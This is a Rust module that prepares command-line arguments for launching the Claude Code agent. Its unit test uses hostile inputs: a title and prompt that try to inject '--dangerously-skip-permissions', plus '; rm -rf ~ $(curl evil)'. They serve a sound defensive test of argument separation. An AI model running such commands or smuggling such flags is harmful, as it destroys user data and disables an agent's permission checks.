//! Prepares native Claude Code launches.

use pwf_application::pending_work::session::{AgentLaunch, AgentProbe, ClaudeSessionClient};

use super::{argv::LaunchArgv, probe};

const BINARY: &str = "claude";

struct ClaudeLaunchPlan {
    title: String,
    model: Option<String>,
    prompt: String,
}

impl From<&AgentLaunch> for ClaudeLaunchPlan {
    fn from(launch: &AgentLaunch) -> Self {
        Self {
            title: launch.title.clone(),
            model: launch.model.clone(),
            prompt: launch.prompt.clone(),
        }
    }
}

/// Probes and prepares native Claude Code launches.
#[derive(Debug, Clone, Copy, Default)]
pub struct ClaudeHarness;

impl ClaudeHarness {
    /// Probes the Claude Code binary.
    #[must_use]
    pub fn probe() -> AgentProbe {
        probe(BINARY)
    }

    /// Returns the exact prepared Claude Code argv for previewing.
    #[must_use]
    pub fn preview(launch: &AgentLaunch) -> Vec<String> {
        Self::prepare(launch).argv
    }

    /// Prepares Claude Code argv from the provider-neutral launch.
    #[must_use]
    pub fn prepare(launch: &AgentLaunch) -> PreparedClaudeLaunch {
        let ClaudeLaunchPlan {
            title,
            model,
            prompt,
        } = ClaudeLaunchPlan::from(launch);
        let mut argv = LaunchArgv::new(BINARY).flag("--name", title);
        if let Some(model) = model {
            argv = argv.flag("--model", model);
        }
        PreparedClaudeLaunch {
            argv: argv.into_guarded(prompt),
        }
    }
}

impl ClaudeSessionClient for ClaudeHarness {
    fn probe(&self) -> AgentProbe {
        Self::probe()
    }

    fn preview(&self, launch: &AgentLaunch) -> Vec<String> {
        Self::preview(launch)
    }

    fn prepare(&self, launch: &AgentLaunch) -> Vec<String> {
        Self::prepare(launch).argv
    }
}

/// Contains prepared native Claude Code argv.
pub struct PreparedClaudeLaunch {
    argv: Vec<String>,
}

impl PreparedClaudeLaunch {
    /// Returns the prepared argv.
    #[must_use]
    pub fn argv(&self) -> &[String] {
        &self.argv
    }
}

#[cfg(test)]
mod tests {
    use pwf_application::pending_work::session::{Agent, AgentLaunch};

    use super::ClaudeHarness;

    #[test]
    fn prepares_native_name_optional_model_and_hostile_values_as_separate_arguments() {
        let launch = AgentLaunch {
            agent: Agent::Claude,
            task_id: "PWF-0038".to_string(),
            title: "--dangerously-skip-permissions".to_string(),
            repository: "/repo/pwf".to_string(),
            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
            model: Some("sonnet".to_string()),
        };

        let prepared = ClaudeHarness::prepare(&launch);

        assert_eq!(
            prepared.argv(),
            [
                "claude",
                "--name",
                "--dangerously-skip-permissions",
                "--model",
                "sonnet",
                "--",
                "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions",
            ]
        );
    }
}
